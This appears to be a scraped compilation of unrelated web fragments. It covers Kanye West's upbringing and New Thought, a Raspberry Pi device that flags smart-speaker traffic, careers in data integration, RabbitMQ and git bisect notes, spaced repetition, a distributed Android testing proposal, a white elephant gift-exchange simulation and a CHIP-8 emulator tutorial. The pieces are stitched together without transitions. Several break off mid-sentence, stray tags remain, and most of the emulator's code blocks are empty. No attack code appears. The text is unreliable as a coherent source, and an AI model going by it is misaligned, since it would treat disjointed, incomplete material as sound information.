<p>The most prominent intellectual influence on Kanye West happened at home; his mother, Professor Donda West. Donda West was a notable English professor at Chicago State University, whose dissertation involved systems approaches to education (as seen in the recently published <a href="https://books.google.ca/books/about/Donda_s_Rules.html?id=iAwdyAEACAAJ&amp;redir_esc=y"><em>Donda’s Rules</em></a>).&nbsp;</p>
<p>It’s clear Donda West’s expertise provided Kanye with a wealth of literary experience and systems thinking to draw from. Through his mother, Kanye became the product of some of the world’s most forward literary thinkers. The world owes Donda West a lot more credit for cultivating Kanye West to be the genius he is.&nbsp;</p>
<p>While Kanye was growing up, his mother made church an important pillar of their lives. On p. 138 of <em>Raising Kanye</em>, Donda West writes:</p>
<p><em>We’d go every Sunday to Christ Universal Temple in Chicago. I liked the church because the minister, Johnnie Colemon, preached prosperity. I had belonged to Hillside Church, which was very similar, before moving from Atlanta, and would take Kanye there. Barbara King, the minister there, was also a very spiritual and progressive thinker. I wanted Kanye to be steeped in that kind of exposure to God. I never bought into the fire-and-brimstone type of religion or one that was repressive. Certainly, I would not expose Kanye to that. But I felt compelled to see to it that a spiritual component was a key part of Kanye’s upbringing.</em></p>
<p><a href="https://religionnews.com/2019/11/21/with-joel-osteen-kanye-drops-a-clue-about-his-faith-and-his-kinship-with-trump/">Colemon’s</a> and <a href="https://www.ajc.com/news/bishop-barbara-l-king-founding-pastor-of-hillside-international-truth-center-dies-at-90/W55VU6ZOUJHMJO6X2G4AUKF7FM/">King’s</a> churches are associated with New Thought, a metaphysical movement encouraging positive thinking, and material wealth as a sign of God’s blessings. There are many movements that fall into New Thought, the most popular one today might be <em>The Secret</em> and the Law of Attraction. Other contemporaries include Goop and Soulcycle.&nbsp;</p>
<p>The fusion of New Thought and Christianity is known as prosperity gospel, the term for a variation of Christianity which proposes that through faith and hard work, God will make your financial and physical dreams come true.&nbsp;</p>
<p>This childhood exposure to prosperity gospel and New Thought is also a core belief, or as Kanye puts it, the “dragon energy,” that binds Kanye West and Donald Trump together. Fred Trump would take a young Donald Trump to Marble Collegiate Church to listen to Norman Vincent Peale’s speeches. Peale is the author of <em>The Power of Positive Thinking</em>.&nbsp;</p>
<p>Kanye’s mentor and “big brother,” Jay-Z, has been at least a dabbler of new thought, <a href="https://www.oprah.com/oprahsbookclub/books-that-made-a-difference-to-jay-z">recommending books like <em>The Seat of the Soul</em>, as well <em>The Celestine Prophecy</em></a>. Similarly, a writer Kanye West works with, Sakiya Sandifer, is a proponent of new thought as well.&nbsp;</p>
<p>Kate Bowler, author of <em>Blessed: A History of the American Prosperity Gospel</em>, describes New Thought: <em>“Adherents, acting in accordance with divine principles, relied on their minds to transform thought and speech into heaven-sent blessings.” </em>Three aspects of New Thought are rooted in the twentieth-century’s view on how the power of the mind:</p>
<ul><li>High anthropology: God and humanity separated only by degree</li><li>Priority of spiritual reality: The world should be reimagined as thought, rather than substance</li><li>Generative power of positive thought: People share in God’s power to create by means of thought; they can shape their own worlds by their thinking</li></ul>

<h3 id="toc-how-it-works-1"><span>How It Works</span></h3><p>A Raspberry Pi computer promiscuously sniffs packets on the local network. A Python script parses these packets, looking for any communication between the smart speaker and the vendor's cloud service. When detected, an API endpoint on an Arduino Nano 33 IoT microcontroller development board is accessed. This causes an LED attached to the Arduino to flash, thus alerting you to a speaker sending data to the vendor.</p><p>A single Raspberry Pi can trigger alerts on a number of Speaker Snitch devices all throughout your home.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>In the modern workplace, data integration skills can help you supercharge your career. Regardless of what kind of job you have, it’s likely you will be working with some kind of software. It might be a cloud billing system, an appointment scheduling system, warehouse software, or even just email. Most software applications are driven by data inputs and outputs. If you have even basic competency with data integration, it can open up many opportunities for you to automate tasks and leverage data to solve business problems.</p><p><strong>By using data, you can increase your impact at work. More impact means more opportunities, career progression, and often bigger compensation.</strong></p><p>Let’s look at how data integration skills can improve your career.</p><p>Whether your job is in accounting, business development, customer service, human resources, logistics, or manufacturing, there’s a pretty good chance data integration techniques could save you time by automating repetitive tasks.</p><p>With all the talk about robots and AI eliminating jobs, you may question whether automation is a good thing. If you can use data integration to automate portions of your job, won’t that signal to management that your job may be expendable? In my experience, employees that embrace technology and use it to be more effective tend to outperform those that resist technology.</p><p>If there are significant parts of your job that cab be automated and you don’t do something about it, eventually your employer will. In some cases, this could involve offshoring your job to a country where labor is less expensive. Or it could be addressed by larger software or automation initiatives which could result in significant changes to your role. Due to the competitive nature of business, there is a continual need to reduce any forms of waste. Companies that don’t continuously improve efficiency lose their competitiveness and eventually die out.</p><p>So, given this “survival of the fittest” business environment what can you do?</p><p>Take charge of automating your own work. Be proactive about eliminating waste in your individual tasks and processes you work with. This will make you a more effective employee. You will deliver better and faster results which increases your value to your organization. It also demonstrates to management that you are a proactive innovator. It could provide job security, win you a higher rating on your next performance evaluation, and ultimately improve your compensation.</p><p>But more importantly you will be demonstrating to you manager and your coworkers how to improve business processes through automation. The improvements you make can be shared with other team members or even with other departments. In some cases, your small but creative automations could lead to a large scale rethink of how your company operates or perhaps even lead to a new product or service.</p><p>Hard to imagine doing this in your current job? Let’s talk through an example.</p><h2 id="how-to-automate-lead-acquisition">How to Automate Lead Acquisition</h2><p>Let’s say you have a general sales inquiry email address posted on your company’s web site. You are working on the marketing team and one of your responsibilities is to monitor incoming emails and look for potential customers that are interested in using your company’s service. When you identify a lead based on an incoming email, you log into <a href="https://www.salesforce.com/">Salesforce</a> and type up a new Lead entry. This then triggers the sales team to reach out to the potential customer to initiate a conversation. This process has to happen pretty quickly. If you wait too long after the potential customer sends the email, they may lose interest and move onto a competitor.</p><p>This process is a perfect candidate for automation using data integration between the email message content and the Salesforce lead API.</p><p>It’s highly likely you could implement this integration with absolutely zero programming using a workflow automation tool like <a href="https://zapier.com/">Zappier</a> or <a href="https://flow.microsoft.com/en-us/">Microsoft Power Automate</a>. In fact, a quick search of the Microsoft Power Automate site will uncover a pre-existing workflow that does exactly what we’re looking for:</p><p><img src="https://res.cloudinary.com/johnberry/image/upload/v1607224978/PowerAutomateSalesforce_smx5vk.png" alt="PowerAutomateParserr"></p><p>It uses a SaaS product called <a href="https://parserr.com/">Parserr</a> which specializes in parsing the unstructured text in email messages and attachments and converting it to structured data which can be more easily imported into databases or other SaaS products.</p><p>Salesforce offers many integration options that allow you to load CRM record types like leads, accounts, contacts and opportunities. In fact, here is publicly available documentation about their <a href="https://developer.salesforce.com/docs/atlas.en-us.sfFieldRef.meta/sfFieldRef/salesforce_field_reference_Lead.htm">Leads API</a>:</p><p><img src="https://res.cloudinary.com/johnberry/image/upload/v1607224981/SalesforceLead_fdjuno.png" alt="SalesforceLead"></p><p>This is a great example where a simple data integration between two SaaS products reduces your labor and adds additional business benefits. The fully automated process will be faster, which will speed the sales team’s response to the customer and increase the percentage of sales wins.</p><p>This makes you more effective as an individual contributor and gets you noticed by your manager. The same integration approach you have taken on this project could be applied to many similar situations in your department or across your company. It’s possible this small success could lead to more growth opportunities at your company. Or possibly it could even be the start of a transition to a technology job, which I’ll explain next.</p><p>There are a variety of roles in the typical IT Department that require data integration expertise. Some IT organizations have a team that focuses on B2B integrations or EDI. Legacy EDI messaging is specialized skill and usually requires expertise with specific B2B platforms like <a href="https://www.softwareag.com/en_corporate/platform/integration-apis.html">WebMethods</a>, <a href="https://www.opentext.com/">OpenText</a>, or cloud-based iPaaS tools (integration platform-as-a-service). Working in a B2B integration team requires cross-functional skills. Besides expertise with EDI specifications and translation software, B2B workers usually need a deep understanding of the back-end systems like the ERP or CRM which are involved with the B2B signals. Soft skills like project management and people skills are critical as well.</p><p>Application-to-Application integration is sometimes managed by a specialized B2B integration team, but often it is handled by a general software engineering team. Since application integration usually leverages technologies like REST APIs, webhooks, GraphQL, or SOAP, IT workers with programming skills are often best suited for building these solutions. In these scenarios, engineers use their programming language of choice (like Python, Java, or C#) to connect various application API’s into an automated workflow.</p><p>Finally database integration projects involving data warehousing, data analytics, and extract-transform-load (ETL) are usually handled by a database or data engineering team. Database integration techniques are quite different from B2B integration and software engineering tasks. Database integration teams will be handling data in bulk (often big data) which requires technical knowledge of the database system’s native features. Data engineering work usually involves data platforms like <a href="https://spark.apache.org/">Apache Spark</a>, <a href="https://airflow.apache.org/">Apache Airflow</a>, <a href="https://www.microsoft.com/en-us/sql-server/">Microsoft SQL Server</a>, <a href="https://www.postgresql.org/">PostgreSQL</a>, or cloud-based ETL tools. With rapidly growing interest in machine learning and artificial intelligence, data engineering is becoming a much more common job title in many IT Departments.</p><p>Any of these data integration disciplines can lead to a rewarding career path. If you are interested in coding, learning to interact with APIs and write the “glue code” that ties APIs into an integrated workflow will make you extremely valuable to potential employers. Data engineering requires expertise with a particular data platform, but tends to requires less traditional programming skills. Finally, B2B integration work requires the least amount of programming skills, but often requires deeper understanding of business processes and strong soft-skills. All of these roles can put you in a position to solve business problems and create value for your employer.</p><p>Are you interested in changing to a technology career but perhaps haven’t had time to learn to code yet? Data integration is a route for a non-technical person to transition into a technology career. In my experience it’s far easier for non-technical people to become effective at integration rather than trying to learn programming from scratch.
This may sound strange. After all, conventional wisdom is that the path to a tech career is learning to code. There is an entire educational industry that has developed around teaching JavaScript or Python to aspiring software engineers. You can go to boot camps or use online resources and after a few months of intensive work, supposedly you will be able to get a lucrative job as a software engineer. Unfortunately, from what I’ve observed many of these programs are glorified get-rich-quick schemes.</p><p>Programming isn’t for everyone. Software engineering requires a certain way of thinking that simply doesn’t come naturally to some people. Any many simply find programming unpleasant or boring. Even if you do manage to learn JavaScript, it’s not necessarily a guaranteed path to a six-figure income.</p><p>Instead of learning a programming language, perhaps a better strategy is to learn some kind of data integration tool or technique. For example, quite possible for most individuals to develop functional expertise with cloud integration platforms like <a href="https://azure.microsoft.com/en-us/services/logic-apps/">Azure Logic Apps</a> or <a href="https://www.mulesoft.com/">Mulesoft</a> within a few months. You can use the tool for a few side projects or even to solve problems in your day job. This provides you some compelling achievements to add to your resume and attract the interest of technology hiring managers.</p><p><a href="https://en.wikipedia.org/wiki/SQL">SQL</a> is another great skill to learn. The ability to query relational databases with SQL can make you more effective in many non-technical jobs, but it’s also a great way to land an entry level tech job on a data analysis or engineering team. SQL is a query language and it tends to be far easier to learn that an a full programming language. Combine basic SQL knowledge with self-serve business intelligence tools like <a href="https://powerbi.microsoft.com/en-us/">Microsoft PowerBI</a> or <a href="https://www.tableau.com/">Tableau</a> and you have most of the skills necessary to move into an …</p></div></div>

That could be getting into courses to up skill yourself. It could be a career switch to a new role with broader/specialised job description as you think is better for your own career. Whatever those maybe, what matters more are often not found in the big decisions as mentioned. Rather, they are found in your daily habits. Reading one technical article a day. Figuring out how to earn 1 buck from your investments a day. The power of atomic habits creates that change you wish to see. How are you improving today?</p>

<p>In this article, I’ve curated some articles I’ve put time to read through the past weeks to share with you all. Its broadly general topics and technical topics.</p>

<p>I’ve attached the youtube briefly explaining about the book <code>atomic habits</code> by James Clear.</p>

</ul>

<p>While people are paying to even get into the beta testing for starlink, this has been a consistent business strategy to acquire capital by the famous Elon Musk for Tesla’s cybertruck. Perhaps this is a classic example of not leaving any money on the table. If people are willing to pay for it, then just take it and also put yourself on a position to provide a minimal standard of quality.</p>

<p>Uniting the local boookshops and allowing them a platform to establish their online presence. A short description of what they do</p>
<br>
<blockquote>
<p>It allows independent bookshops to create their own virtual shopfront on the site, with the stores receiving the full profit margin – 30% of the cover price – from each sale. All customer service and shipping are handled by Bookshop and its distributor partners, with titles offered at a small discount and delivered within two to three days</p>
</blockquote>

<p>Really amazing how people are taking that leap of faith to stand for what they believe in and actually pursues it. Its definitely one of the most rewarding feeling to see what you believe in takes fruit and gaining traction.</p>

<p>It is always more insightful to hear what are non FAANG companies doing on their engineering front.

</ul>

<p>It is a really insightful article to look at our daily life activity (video call) from a different lens. Its heartening to hear how the disability does not deter companies from valuing the skill and results of these people.</p>

<p>Otter, google meets, Zoom, these are tools that are specialized at what they do and thus integration of services can often times be more valuable than we engineers can imagine. While it makes sense to build your features in-house but that will probably pale in comparison to companies which are specialized and focused on the feature.</p>

<p>For example, zoom wishes to do caption but that would not be as comprehensive as Otter which is a tool specialised for caption capturing.</p>

<p>Self driving was never imaginable a decade ago and here we are putting human into the hands of software to beta-test the possibility of human free driving. Amazing work and article sharing some user experiences through those tests.</p>

Simple is better. Just write a decent <a ref="nofollow" target="_blank" href="http://readme.md/">readme.md</a> and that already serves the purpose of documentation: let other developers understand what is going on with this tool, how to use it, when to use it, and what are the edge cases not covered. This might be an example of over-engineering and making the possibly-best solution more complicated than it already is.</p>

</ul>

<p>Every line of code comes at a cost: maintenance. To avoid paying a large price for every line of code written, we build reusable components.</p>
<br>
<ul>
<li>Repeat your code to avoid creating dependencies, but do not repeat yourself to manage them.</li>
<li>Split your code by separating out hard-to-write pieces of code with frequently-changed ones.</li>
<li>Layer your code by building simple-to-use APIs out of simpler-to-implement parts. A component is made up for even smaller components like that of a lego.</li>
</ul>

<p>Genuinely, this is one piece of bad writing, but the essence is paramount. Write code that requires as little maintenance in the future. Writing readable code lowers your maintenance cost. Writing test lowers maintenance cost. On and on; if you just take a moment to think through, are there exceptions to good coding practices that ends up actually creating more maintenance cost?

<li><a ref="nofollow" target="_blank" href="https://tanzu.vmware.com/developer/blog/understanding-the-differences-between-rabbitmq-vs-kafka/">What is the difference between RabbitMQ vs Kafka</a></li>
</ul>

<p>It is built around the popular AMQP protocol. What is this protocol<br>
<a ref="nofollow" target="_blank" href="https://en.wikipedia.org/wiki/Advanced_Message_Queuing_Protocol">https://en.wikipedia.org/wiki/Advanced_Message_Queuing_Protocol</a></p>

<p>RabbitMQ is often summarized as an “open source distributed message broker”<br>
Apache Kafka is described as a distributed event streaming platform; focusing on facilitating raw throughput.</p>

<p>If you ever want to decide between thee two applications, consider the following</p>
<ul>
<li>What skills are needed to operate these services</li>
<li>What is the strength of its surrounding developer community</li>
<li>What does these two services excel at?</li>
</ul>

<p>If you want to consider use-cases which has more specific routing needs and per-message guarantees, consider RabbitMQ. This service is created with these use-cases in mind and thus serves these use-cases more specifically.</p>

<p>The developer community around these two services have been going steadily. So that makes this factor (at least for these two services in particular) negligible. Its a tie!</p>

<p>RabbitMQ do have its own kubernetes operator. So you can consider leveraging on that for your livechat services if that is what you wish to pursue in the long run. When you are using Kubernetes, there are much more opportunities to leverage your resource and the CICD’s innovations.</p>

<p>it is interesting from how I managed to learn at least 5 new concepts from a single article. Definitely this scope of work is hugely unfamiliar to me. While i am in a stage of my engineering journey to explore more deep-tech tools for more specific business use-cases. I have to stay ahead my the current situations i am exposed so i can be ready as i start to walk down the growth path I’ve set for myself when i choose to leave the comfort of my full time to pursue my own idea.</p>

<p>The new concepts i’ve learnt are mainly:</p>
<ol>
<li>There exists something called binary-based stream protocol</li>
<li>What is AMQP? Advanced Message Queuing Protocol</li>
<li>There are actually such a thing call streaming use-cases.</li>
</ol>

<li><a ref="nofollow" target="_blank" href="https://medium.com/@fredrikmorken/why-you-should-stop-using-git-rebase-5552bee4fed1">Why you should stop using git rebase</a></li>
</ul>

<p>This is a good article to help you understand the difference between git rebase and git merge. Going back a step to the purpose of a git, it is to keep your source of truth on the master branch. If there is a bug, you can revert back, track back, hunt it down with ease and get it sorted out without having to pull out all your hair. Rebase while it keeps your history clean does not entirely prioritize or set you up for the purpose as mentioned earlier. It makes the debugging harder if the feature branch you are rebasing is vast and has thousands of commit. That makes the entire debugging process more tedious than its needed to be in the context of git. A good fundamental read to get yourself up to date on the use-cases of git.</p>

<p>There is a new learning called git bisect. It allows you to use binary search to find the commit in which the bug was introduced.</p>

<p>You start of your bug search in this manner</p>
<br>
<blockquote>
<p>git bisect start<br>
git bisect bad # Indicate the current version is bad<br>
git bisect good # Indicate from which commit is the version good</p>
</blockquote>

<p>Once you have the the following above, git bisect will select a commit in the middle of that range (as you would expect of a binary search), checks it out and output something as the following</p>
<br>
<blockquote>
<p>Bisecting: 675 revisions left to test after this (roughly 10 steps)</p>
</blockquote>

<p>Once you see the message above, that indicates that the middle commit has been checked out. If that version is working correctly, type</p>
<br>
<blockquote>
<p>git bisect good</p>
</blockquote>

<p>if its bad, type</p>
<br>
<blockquote>
<p>git bisect bad</p>
</blockquote>

<p>you can check out the git bisect documentation over <a ref="nofollow" target="_blank" href="https://git-scm.com/docs/git-bisect">here</a>.</p>

<p>I recently read an interesting article about meta learning and spaced repetition that left me thinking hard about these subjects.</p>



<p>While I agree that meta learning is an essential skill everyone should learn and even master, I’m very skeptical about the real value of spaced repetition.</p>



<p>Let me make clear that I’m not questioning its effectiveness: I’m aware it’s been consistently shown that spaced repetition works — it helps you move information from your short-term memory to your long-term memory. What I’m questioning here is its value and usefulness in real life.</p>



<p>My problem with spaced repetition is that it leaves a fundamental ingredient out of the learning process: experience. Without the context provided by a real-life situation, learning is isolated from reality, and, thus, it becomes artificial, passive and mechanical. There’s no skin in the game. There’s no real struggle. There’s no tangible outcome.</p>



<p>So I can’t help but wonder what’s the point of just remembering information if you don’t know how or when to apply it?</p>



<p>What if instead of memorizing information you try to actively do, create or build something with it?</p>



<p>Wouldn’t that be more meaningful and enriching; also, more fun and rewarding?</p>

I'm exploring tapping into this latent resource pool to make automated testing affordable &amp; unlock a more comprehensive configuration coverage.</p><p>The goal of DART (Distributed Android Remote Testing) is to enable any Android device to run automated tests — without ADB or complex setups/maintenance. A commercial product could pay people per hour of device use, allowing anyone to utilize idle device time. Each device is subsumed to provide a distributed testbed.</p><p>DART is orthogonal to <a href="https://en.wikipedia.org/wiki/Crowdsourced_testing">crowdsourced testing</a> — the latter requires active human participation.</p><p>DART seems to be the best solution to utilize device idle time — the best way to verify that an app works on "Samsung S9" is by executing it on "Samsung S9".  Contrast this to other procedures where phones are usually a suboptimal option: server hosting, remote computation, etc.</p><p>In the demo below, I ran a few test cases on <a href="https://play.google.com/store/apps/details?id=org.mozilla.focus&amp;hl=en_US&amp;gl=US">Mozilla Focus Privacy Browser</a> without cables/ADB.</p><p><iframe width="100%" height="100%" src="https://www.youtube.com/embed/CcHEsx7ODyw" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></p><h3>1.1. 💪 Motivation</h3><p>The following problems motivated the development of DART.</p><h5>i. 🧩 Android Device Fragmentation</h5><img src="https://elvischidera.com/4c37a9cd069bcaa8ee86c04764a37790/android_fragmentation.gif" alt="Android device fragmentation"><p>The top device farms barely cover 1% of the total number of Android device models. Nondistributed device farms favor depth instead of breadth — maintenance cost increases as more diverse devices are added.</p><p>Testing on flagship devices alone doesn't always suffice.</p><blockquote><p>Anecdote: I once spent an entire day debugging an ANR that occurs to a small fraction of our users.

    </span></a></p><h5>ii. 👩🏽‍💻 Publisher Perspective</h5><p>The publisher cares about test fraud and product leaks.</p><p>Proof of work disincentivizes test fraud. The server can use device logs, screenshots, videos with UUID, and past executions to validate submitted work results. As this isn't watertight, it is best combined with other strategies: user verifications, <a href="https://developer.android.com/training/safetynet">device attestation</a>, randomization, and device throughput throttling.</p><p>Preventing product leaks is hard  — if it runs on a phone, any sufficiently motivated (&amp; knowledgeable) person can figure out a way to access objects. Three good-enough solutions are:</p><p>a. Running headless tests.</p><p>b. Using a private network of vetted devices.</p><p>c. Adopting only for binaries at the later end of the release pipeline.</p><h3>1.4. 🎃 Going Headless</h3><p>It is possible to obscure the application under test using a simple overlay. The video below shows the execution of the test cases of the Google IO 2019 app. On the right, the app interactions are invisible. Depending on the strategy, concealing actions do not affect screenshots or videos.</p><p><iframe width="100%" height="100%" src="https://www.youtube.com/embed/jxwsoe3T8yE" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></p><p>With framework UI component wrappers, it is possible to borrow some ideas from <a href="https://android.googlesource.com/platform/frameworks/base/+/4db1f432b853152075923499768639e14403b73a/tools/layoutlib/README">Layoutlib</a> to offer a full headless solution. <code>Layoutlib</code> is a custom version of the android View framework designed to run inside Eclipse. The goal of the library is to provide layout rendering in Eclipse that are very close to their rendering on devices.</p><h3>1.5. 📦 Containerization</h3><p>Tests need to run in an isolated environment. A plugin framework like <a href="https://github.com/didi/VirtualAPK">VirtualAPK</a> can be built to offer a layer of isolation between apps and the OS. This works using the <code>DexClassLoader</code> and some reflection hacks to modify framework components. With this approach, apps can be seamlessly loaded &amp; unloaded without any user interaction.</p><p><span>

<p>Motu’s staff Christmas party is this Friday.
We’re planning a <a href="https://en.wikipedia.org/wiki/White_elephant_gift_exchange">white elephant gift exchange</a>: everyone contributes a wrapped gift to a common pool and sequentially chooses to either (i) unwrap a gift or (ii) steal a previously unwrapped gift.
“Victims” of theft make the same choice, but previously stolen gifts cannot be re-stolen until a new gift is unwrapped.
The exchange ends when the last gift is unwrapped.</p>
<p>Suppose I want to maximise the subjective value of the gift in my possession when the exchange ends.
I must overcome two strategic challenges:
I don’t know the subjective values of wrapped gifts, and
I don’t know other players’ subjective values of wrapped <em>or unwrapped</em> gifts.
Therefore, any strategy I adopt must account for uncertainty both in wrapped gifts’ subjective values and in the propensity of other players to steal unwrapped gifts I covet.</p>
<p>One strategy could be to always steal the unwrapped gift with the highest subjective value.
This strategy is risky because my subjective valuations might correlate with those of other players, making it more likely I will become a victim of theft.
I could hedge this risk by instead always stealing the unwrapped gift with the <em>second</em> highest subjective value (unless I’m the last player, in which case I would be better off stealing the most subjectively valuable gift because it can’t be re-stolen).
Alternatively, I could play as a pacifist and never steal (unless I’m the last player).</p>
<p>I compare these three strategies—greediness, hedged greediness, and pacifism—via simulation.
I assume gifts’ subjective values are determined as the mean of two <a href="https://en.wikipedia.org/wiki/Uniform_distribution_(continuous)#Standard_uniform">standard uniform</a> random variables: one describing an underlying value common to all players, and one describing an idiosyncratic component unique to each player.
I simulate 1000 games among 30 players, randomising the strategies adopted by each player in each game.</p>
<p>For each simulated game, I compute the subjective value of the gift in each player’s possession when the exchange ends.
I also compute the allocation that maximises aggregate (i.e., the sum of) subjective values.
I refer to the subjective values in this allocation as “efficiency baselines,” and use them to compare strategies’ tendencies to deliver socially optimal allocations.
I summarise my simulation results in the plot below.</p>
<p><img src="https://bldavies.com/blog/white-elephant-gift-exchanges/figures/plot-1.svg" alt=""></p>
<p>Across all strategies, players whose turns arrive later in the game tend to be better off.
Such players have more choices of gifts to steal and fewer opportunities to become victims of theft.
Greedier players tend to end up with more subjectively valuable gifts, while pacifists—who never use victimisation as an opportunity to “trade up”—typically possess the least subjectively valuable gifts when the exchange ends.
Only late and/or greedy players tend to do better than under the socially optimal allocation.</p>
<p>Choosing not to steal is risky because it may result in unwrapping a low-value gift that no other players want to steal.
The first player, who cannot steal, is particularly exposed to this risk.
The game could be made fairer by allowing the first player (and subsequent victims) to unilaterally swap gifts when everyone else has had their turn.
This adjustment shifts the disadvantage to the second player, who, in the game’s pre-swap phase, has only two choices: steal from the first player or unwrap a new gift.
Giving more players a second turn could improve the final gift allocation by giving early players a larger choice set.</p>
<p>The table below shows how the efficiency and equity of the final gift allocation varies with the number of early players given a second turn.
I measure efficiency by the ratio of aggregate subjective values to aggregate efficiency baselines.
I define equity as one minus the <a href="https://en.wikipedia.org/wiki/Gini_coefficient">Gini coefficient</a> for the distribution of subjective values.
The table reports 95% confidence intervals across 1000 simulated games.</p>
<table>
<thead>
<tr>
<th>Players given second turn</th>
<th>Efficiency (%)</th>
<th>Equity (%)</th>
</tr>
</thead>
<tbody>
<tr>
<td>0</td>
<td>83.9 ± 0.2</td>
<td>80.3 ± 0.2</td>
</tr>
<tr>
<td>1</td>
<td>88.8 ± 0.2</td>
<td>83.0 ± 0.2</td>
</tr>
<tr>
<td>2</td>
<td>88.7 ± 0.2</td>
<td>82.8 ± 0.2</td>
</tr>
<tr>
<td>3</td>
<td>88.6 ± 0.2</td>
<td>82.7 ± 0.2</td>
</tr>
<tr>
<td>4</td>
<td>88.6 ± 0.2</td>
<td>82.6 ± 0.2</td>
</tr>
<tr>
<td>5</td>
<td>88.3 ± 0.2</td>
<td>82.4 ± 0.2</td>
</tr>
</tbody>
</table>
<p>Giving the first player a second turn makes the final allocation more efficient and more equitable.
That player gets a chance to improve upon their initial endowment, and subsequent victims get a chance to reconsider their choices with more information about the distribution of gifts’ subjective values.
However, on average, giving further players a second turn appears to push efficiency and equity back down.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content"> <article itemscope="" itemtype="https://schema.org/BlogPosting">  <div itemprop="articleBody">  <p>For several reasons, emulation has always fascinated me. A program that executes other programs sounds like such a cool concept. It really feels like you’re getting your money’s worth out of writing it! Beyond that, it definitely feels like you’re <em>building</em> a computer within software. I really enjoyed learning about computer architecture and writing some basic HDL code, but emulation is a much more straightforward way of achieving a similar feeling of generating a machine. I’ve also always had this goal of knowing exactly how <em>Super Mario World</em> worked, ever since I first saw it as a kid. Because of this, writing a SNES/SFC emulator has been on my mind for a while. I decided recently that it was time to take a <a href="https://github.com/rivergillis/chip-8">step forward</a> towards making this happen.</p> <p>So let’s take a look at writing an emulator. A simple, but complete example would involve CHIP-8.</p> <p><a href="https://en.wikipedia.org/wiki/CHIP-8">CHIP-8</a> is actually a programming language. It’s really simple too, there’s only <a href="http://devernay.free.fr/hacks/chip8/C8TECH10.HTM#3.0">35 opcodes</a>. To write an interpreter for it, we pretty much just need to write a program that can execute all 35 different instructions. The <em>emulation</em> aspect of this comes from the bits you wouldn’t normally find in a programming language interpreter. We need a way to display graphics, process user input, play audio, and we need to simulate the hardware mechanisms of a CHIP-8 machine. Things like registers and memory need to be taken into account during execution, and we also need to be careful about timing.</p> <p>Let’s start! For this project, we’ll be using C++. This should be fairly trivial to translate into other languages. If you want to take a look at the complete source, see the <a href="https://github.com/rivergillis/chip-8">project repository</a>.</p> <p>First, a basic main loop. We’ll ignore emulating timing for now.</p> <div><div><pre><code><span>// main.cpp</span>

    <span>return</span> <span>1</span><span>;</span>
  <span>}</span>
<span>}</span>
</code></pre></div></div> <p>Our <code>CpuChip8</code> class will encapsulate the state of our virtual machine and interpreter. Now if we implement <code>RunCycle</code> and <code>Initialize</code> we’ll have ourselves a basic emulator skeleton. We now need to discuss the phsyical system we’re emulating.</p> <p>Our CHIP-8 system will be the <a href="https://en.wikipedia.org/wiki/Telmac_1800">Telmac 1800</a>. We’ve got ourselves a pool of 4K of memory, a 64x32 1-bit display, and the ability to beep. <em>Nice</em>. The CHIP-8 interpreter itself is implemented via a virtual machine. We need to keep track of a stack, sixteen 8-bit registers (named V0 through VF), a 12-bit index register (named I), a program counter, two 8-bit timers, and a 16-frame stack.</p> <p>The canonical memory map looks like this:</p> <div><div><pre><code>0x000 |--------------------|
      | Interpreter memory |
      |                    |
0x050 | Built-in fontset   |
0x200 |--------------------|
      |                    |
      |                    |
      | Program memory     |
      | and dynamic allocs |
      |                    |
      |                    |
0xFFF |--------------------|
</code></pre></div></div> <p>You’ll notice there’s no explicit stack here. The program actually doesn’t have a stack to address, that’s only used by the interpreter to implement jumping to functions and back. With this in mind we can draw up a header.</p> <div><div><pre><code><span>// cpu_chip8.h</span>

We also have 16 digital input keys, which we store as either on or off within this class. When we hook up input, we’ll find a way to feed that into the class between cycles. The opcode is made easy by the fact that all CHIP-8 instructions are 2 bytes long.</p> <p>So that gives us 0xFFFF=64k possible instructions (though many are unused). We can actually store every possible instruction in a map so that when we fetch an opcode we are able to immediately execute it by calling the associated <code>Instruction</code> in <code>instructions_</code>. Since we don’t bind much data to the functions, which should be able to fit the entire instruction map in cache!</p> <p>Our <code>Initialize</code> function is where to set up the memory map described above:</p> <div><div><pre><code><span>// cpu_chip8.cpp</span>

</code></pre></div></div> <p>Don’t worry about trying to read that file loading code, the C++ iostream library is kind of ridiculous. The gist of it here is that we set everything to 0 and load things into memory that need to be loaded. The fontset here is a series of 16 built-in sprites that programs can reference as they want. We’ll go over how that memory forms sprites later on when we worry about graphics. Our goal is that once <code>Initialize</code> complete we’re set up to execute a user program.</p> <p>Let’s build out a basic <code>RunCycle</code> so that we have a better idea of out to write <code>BuildInstructionSet</code>. If you remember any basic computer architecture, a cycle has a few phases. First you fetch the instruction, then you decode it, then you execute it.</p> <div><div><pre><code><span>// cpu_chip8.cpp</span>

</code></pre></div></div> <p>This is pretty much just a map lookup to find the function to execute. The one weird bit here is how we read in the next opcode. CHIP-8 uses a big-endian archicture, which means the most-significant part of the word comes first, followed by the least significant part of the word. This is reversed in modern x86-based systems.</p> <div><div><pre><code>Memory location 0x000: 0xFF 
Memory location 0x001: 0xAB

Big endian interpretation:    0xFFAB
Little endian interpretation: 0xABFF
</code></pre></div></div> <p>Note that we don’t alter the program counter within <code>RunCycle</code>. This is done on a function-by-function base, so we leave that to the implementation of the particular <code>Instruction</code>. Also, since we chose to define <code>Instruction</code> as a function pointer without any arguments, we’re going to have to bind those to the function itself. This requires more work in the initial set-up, but means we completely remove the instruction-decode phase on <code>RunCycle</code>.</p> <p>Let’s dig into the meat of the interpreter, <code>BuildInstructionSet</code>. I wont list the implementations for every function here, but you can find that in the <a href="https://github.com/rivergillis/chip-8">repository for this project</a>. I highly recommend coding this alongside something like <a href="http://devernay.free.fr/hacks/chip8/C8TECH10.HTM#3.1">Cowgod’s technical reference</a>.</p> <div><div><pre><code><span>// cpu_chip8.cpp</span>

    <p>Before I got into productivity and performance, I used to spend many hours online ingesting vast troves of digital content. My information diet ranged from inspirational TED talks to specialized podcasts, from blog posts found on Hacker News to ebooks shared on Twitter.</p>
<p>I’m deeply curious, and I gave in to new content as much as I could. What could be the harm?—I thought. I <em>loved</em> spending my time this way. It felt useful, it was fun, and it nurtured my self-image as a “smart guy” — all at the same time. Truly, a learning hack.</p>
<p>Turns out I wasn’t hacking anything: The learning wasn’t real.</p>
